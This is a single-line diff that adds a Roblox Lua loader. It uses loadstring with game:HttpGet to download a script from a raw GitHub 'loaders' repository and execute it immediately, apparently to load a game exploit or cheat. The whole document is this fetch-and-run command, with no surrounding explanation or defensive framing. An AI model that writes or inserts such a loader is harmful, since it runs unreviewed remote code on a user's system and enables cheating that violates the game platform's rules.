@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/spooky-beyond-volleyball-league-spam7-lhikf0hyo2bztx.lua"))()
